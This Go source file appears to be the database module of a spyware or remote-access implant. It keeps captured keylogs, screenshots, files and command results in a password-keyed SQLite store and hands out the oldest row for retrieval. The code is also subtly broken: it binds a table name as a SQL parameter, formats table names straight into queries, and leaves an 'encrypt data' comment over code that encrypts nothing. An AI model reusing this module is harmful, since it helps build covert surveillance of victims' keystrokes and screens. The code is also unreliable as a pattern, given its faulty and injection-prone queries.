package db

import (
	"database/sql"
	"errors"
	"fmt"
	_ "modernc.org/sqlite"
	"os"
	"time"
)

const (
	FilesDataType       = "files"
	CommandsDataType    = "commands"
	KeylogsDataType     = "keylogs"
	ScreenshotsDataType = "screenshots"
)

const dbSchemaFilePath = "./db/schema.sql"

var dbInstance *sql.DB

func Init(dbPath string, dbPassword string) error {
	firstInstall := false

	if _, err := os.Stat(dbPath); os.IsNotExist(err) {
		firstInstall = true
	}

	err := initDBInstance(dbPath, dbPassword)
	if err != nil {
		return err
	}
	if err = loadSchema(dbInstance); err != nil {
		return err
	}

	if firstInstall {
		_, err = dbInstance.Exec("INSERT INTO metadata (install_time) VALUES (?)", time.Now())
		if err != nil {
			return err
		}
	}

	return nil
}

func initDBInstance(dbPath string, dbPassword string) error {
	connStr := fmt.Sprintf("%s?_pragma_key=%s", dbPath, dbPassword)
	var err error
	dbInstance, err = sql.Open("sqlite", connStr)
	if err != nil {
		return err
	}
	return nil

}

func loadSchema(db *sql.DB) error {
	schema, err := os.ReadFile(dbSchemaFilePath)
	if err != nil {
		return fmt.Errorf("failed to read schema.sql: %v", err)
	}

	tx, err := db.Begin()
	if err != nil {
		return fmt.Errorf("failed to start transaction: %v", err)
	}
	_, err = tx.Exec(string(schema))
	if err != nil {
		err := tx.Rollback()
		if err != nil {
			return err
		}
		return fmt.Errorf("failed to execute schema: %v", err)
	}

	return tx.Commit()

}

func ReadOldestRow(table string) (string, []byte, time.Time, error) {
	rawQuery := "SELECT * FROM %s WHERE exec_time = (SELECT MIN(exec_time) FROM %s) LIMIT 1"
	query := fmt.Sprintf(rawQuery, table, table)
	row := dbInstance.QueryRow(query)

	var requestID string
	var data []byte
	var execTime time.Time
	err := row.Scan(&requestID, &data, &execTime)
	if err != nil {
		if errors.Is(err, sql.ErrNoRows) {
			return "", nil, time.Time{}, nil // No data
		}
		return "", nil, time.Time{}, err
	}
	err = RemoveOneRow(table, requestID)
	if err != nil {
		return "", nil, time.Time{}, err
	}
	return requestID, data, execTime, nil
}

func RemoveOneRow(table string, requestID string) error {
	_, err := dbInstance.Exec("DELETE FROM ? WHERE request_id = ?", table, requestID)
	return err
}

func WriteDataRow(requestID string, dataType string, data []byte) error {
	// encrypt data
	query := fmt.Sprintf("INSERT INTO data (request_id, data, data_type, exec_time) VALUES (?, ?, ?, ?)")
	_, err := dbInstance.Exec(query, requestID, data, dataType, time.Now())
	return err
}
